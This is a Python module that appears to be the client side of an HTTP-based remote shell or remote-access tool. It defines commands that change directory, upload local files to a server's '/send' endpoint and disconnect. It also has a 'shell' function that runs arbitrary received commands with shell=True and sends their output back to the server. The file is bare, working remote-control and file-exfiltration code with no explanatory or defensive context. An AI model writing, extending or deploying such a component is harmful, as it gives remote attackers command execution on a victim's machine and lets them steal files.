import http.client
import os
import subprocess
from pathlib import Path
from typing import Sequence

client_commands = list()


def client_command(func):
    client_commands.append(func.__name__)
    return func


@client_command
def cd(client, dest_dir: str) -> None:
    try:
        os.chdir(Path(dest_dir).expanduser())
    except FileNotFoundError as e:
        client.send(f"{e}\n")


@client_command
def upload(client, filename: str) -> None:
    if not Path(filename).is_file():
        client.send(f"{filename}: No such file")
    else:
        with open(file=filename, mode='rb') as fd:
            client.send(fd.read(), url=f"{client.server_url}/send")


@client_command
def disconnect(client, *args, **kwargs):
    connection = http.client.HTTPConnection(host=client.server_address,
                                            port=client.server_port)
    connection.request(method="GET",
                       url=client.server_url,
                       headers={"Connection": "close"})
    raise SystemExit


def shell(client, command: [str, Sequence[str]]) -> None:
    cmd = subprocess.run(command, capture_output=True, shell=True)
    for result in cmd.stdout, cmd.stderr:
        if len(result) > 0:
            client.send(result)


def get_cwd() -> Path:
    return Path.cwd()
